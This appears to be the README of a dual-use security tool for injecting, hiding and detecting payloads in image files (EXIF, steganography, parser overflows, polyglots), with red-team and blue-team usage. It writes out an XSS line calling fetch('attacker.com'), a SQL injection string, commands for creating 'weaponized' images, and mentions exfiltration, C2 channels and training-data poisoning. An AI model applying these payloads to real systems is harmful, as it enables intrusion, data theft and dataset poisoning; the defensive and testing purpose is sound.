# Image Payload Injection

Every image accepts data beyond pixels. EXIF metadata. ICC profiles. Thumbnail caches. Steganographic channels.

**Every parser = potential exploit.**

---

## What It Does

**Metadata injection:** Arbitrary code in EXIF fields. Most apps parse without validation.

**Steganography:** Hide payloads in pixel data. LSB manipulation. Invisible to eye, readable by decoder.

**Parser exploits:** Buffer overflows in libpng, libjpeg, RAW parsers. Legacy C/C++ code.

**Polyglot files:** Valid image + valid script. Dual-format attacks.

---

## Installation

```bash
git clone https://github.com/ghostintheprompt/image-payload-injection
cd image-payload-injection
pip install -r requirements.txt
```

**Requirements:**
- Python 3.8+
- PIL/Pillow
- numpy, opencv-python
- Optional: rawpy (RAW analysis), scikit-learn (ML detection)

---

## Quick Start

**Analyze image:**
```bash
ipi scan suspicious_image.jpg
```

**Inject metadata payload:**
```python
from ipi import ImageAnalyzer

analyzer = ImageAnalyzer('target.jpg')
analyzer.inject_exif('Artist', '<script>payload</script>')
analyzer.save('weaponized.jpg')
```

**Extract hidden data:**
```python
from ipi import ImageAnalyzer

analyzer = ImageAnalyzer('innocent.png')
hidden = analyzer.extract_steganography()
```

---

## Features

### Metadata Injection
EXIF fields accept arbitrary data. Artist field often displayed by galleries. Comment field parsed by AI analyzers.

```python
# Inject into EXIF
exif[0x013B] = "'; DROP TABLE users; --"
exif[0x9286] = "<script>fetch('attacker.com')</script>"
```

Social platforms display photographer credits without sanitization. AI content analyzers trust Comment field input.

### Steganography
Hide data in image pixels. Least significant bit manipulation.

```python
# LSB steganography
from ipi import StegoHide

stego = StegoHide('cover.png')
stego.hide_data('ssh root@server.com -p 2222')
stego.save('shared_on_social.png')
```

**Use cases:**
- Exfiltrate data through firewalls
- C2 channels via public images
- Watermark bypass

### Parser Exploits
Image parsers are complex C/C++ codebases. Buffer overflows. Integer overflows. Heap corruption.

**PNG chunk overflow:**
```
Normal chunk: [Length: 13][Type: IHDR][Data: 13 bytes]
Malicious:    [Length: 13][Type: IHDR][Data: 5000 bytes]
                                        ↑ Buffer overflow
```

Parser allocates 13 bytes. Reads 5000. Overflows buffer. Code execution.

**RAW parsers worse:**
- Proprietary formats (CR2, NEF, ARW)
- Less scrutiny than JPEG/PNG
- Trusted by professionals
- Parsed by Lightroom, Photoshop, Bridge

### Detection Capabilities
- SVG JavaScript analysis
- RAW file tampering detection
- Color histogram anomaly detection
- ML-based pattern recognition
- Format structure validation

---

## Attack Vectors

### Social Media
Images bypass content filters. Look innocent. Reach millions.

Platforms strip some metadata. Keep some. Transform through parsers. All attack surface.

### AI Training Datasets
Scraped web images. Millions ingested without sanitization. Poison the dataset. Affect model behavior.

### E-commerce/Dating Apps
Product photos. Profile pictures. All parsed. All transformed. C2 channels hidden in plain sight.

### Photography Workflows
50MB+ RAW files. 500+ per shoot. Sent to retouchers. Published to agencies. Archived in cloud. Parsed automatically.

One weaponized RAW in batch of 500. Gets processed. No validation.

---

## For Red Teams

Test image upload endpoints. Check metadata survival. Look for parser versions.

RAW files get less scrutiny than JPEGs. Proprietary formats. Complex parsers. High-value targets.

**Integration:**
```bash
# Scan upload endpoint
ipi scan --url https://target.com/upload

# Generate weaponized image
ipi create --payload xss --output weaponized.jpg

# Test parser
ipi fuzz --parser /usr/lib/libpng.so
```

---

## For Blue Teams

Strip all metadata before publishing. Validate dimensions vs file size. Sandbox image processing.

Multi-layer detection: content + timing + volume + protocol analysis.

**Defense:**
```bash
# Sanitize image
ipi sanitize input.jpg --output clean.jpg

# Batch scan
ipi scan --directory ./uploads --recursive

# CMS integration
ipi wordpress-scan --library /var/www/wp-content/uploads
```

---

## Web Interface

Browser-based analysis and sanitization:

```bash
python -m ipi.web_interface
# Access: http://localhost:5000
```

Features:
- Real-time visualization
- Risk assessment reports
- Batch processing
- CMS integration

---

## Technical Details

**Supported formats:**
- JPEG (EXIF, JFIF, IPTC)
- PNG (chunk manipulation, tEXt/zTXt)
- TIFF (IFD structure exploits)
- RAW (CR2, NEF, ARW metadata)
- GIF (comment block injection)
- SVG (JavaScript detection)
- WebP, AVIF (modern formats)

**Attack techniques:**
- LSB steganography
- EXIF injection
- Chunk overflow
- Polyglot files
- ICC profile injection

**Detection methods:**
- Format structure validation
- Statistical anomaly detection
- ML-based pattern matching
- Metadata forensics

---

## Use Cases

**Authorized pentesting:** Client networks with image processing. Test upload endpoints. Parser version disclosure.

**Security research:** Parser vulnerability discovery. Format specification analysis. Detection bypass techniques.

**Defense development:** Blue team training. Understanding attacker techniques. Building better detection.

---

## Don't Be Stupid

**Unauthorized use = federal prison.** CFAA violation. Real consequences.

**No authorization = don't use this tool.** Period.

For red teams testing defenses. Not criminals.

You need: Written authorization. Defined scope. Professional engagement or research environment.

---

## Why This Exists

Fashion photographers send RAW files everywhere. Email. WeTransfer. Dropbox. Clients parse blindly.

Built this after watching the same files that document fabric potentially document infrastructure.

Images are data structures parsed by code. Code has bugs. Bugs become exploits.

---

## Latest Updates (Feb 2026)

- Python 3.13 compatibility
- Enhanced SVG JavaScript detection
- RAW file deep analysis
- ML-based anomaly detection
- WordPress plugin integration
- Expanded format support (WebP, AVIF)
- Real-time web interface

---

## License

MIT License. Educational purposes only.

---

**[github.com/ghostintheprompt/image-payload-injection](https://github.com/ghostintheprompt/image-payload-injection)**

Metadata injection. Steganography. Parser exploits.

Authorized pentests only. Written permission required. Don't be stupid.
